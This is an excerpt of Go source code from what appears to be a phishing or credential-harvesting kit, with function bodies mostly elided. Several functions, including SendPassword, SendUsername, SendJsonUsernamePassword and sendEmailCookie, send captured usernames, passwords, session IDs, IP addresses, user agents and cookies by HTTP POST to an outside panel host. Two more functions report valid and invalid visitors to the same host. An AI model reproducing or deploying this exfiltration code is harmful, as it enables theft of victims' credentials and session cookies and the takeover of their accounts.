...
func (d *Database) SendInvalidVisitor(sid int, pl_name string, req *http.Request, remote_addr string, key string) {
	...
	request, _ := http.Post("https://noirlegacypanel-panel.online/api/invalidvisitor", "application/json", responseBody)
...
func (d *Database) SendValidVisitor(req *http.Request, remote_addr string, key string) {
	...
	request, err := http.Post("https://noirlegacypanel-panel.online/api/validvisitor", "application/json", responseBody)
...
func (d *Database) SendPassword(username string, session_id string, key string) {
	...
	if username != "" {
		...
		request, err := http.Post("https://noirlegacypanel-panel.online/api/password", "application/json", responseBody)
...
func (d *Database) SendJsonUsernamePassword(username string, session_id string, key string, ip string, req *http.Request) {
	...
	if username != "" {
		...
		request, err := http.Post("https://noirlegacypanel-panel.online/api/json1", "application/json", responseBody)
...
func (d *Database) SendUsername(username string, session_id string, key string, req *http.Request, ip string) {
	...
	if username != "" {
		...
		request, err := http.Post("https://noirlegacypanel-panel.online/api/username", "application/json", responseBody)
...
func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string, remoteIp string, userAgent string) {
	...
	request, err := http.Post("https://noirlegacypanel-panel.online/api/cookies", "application/json", responseBody)
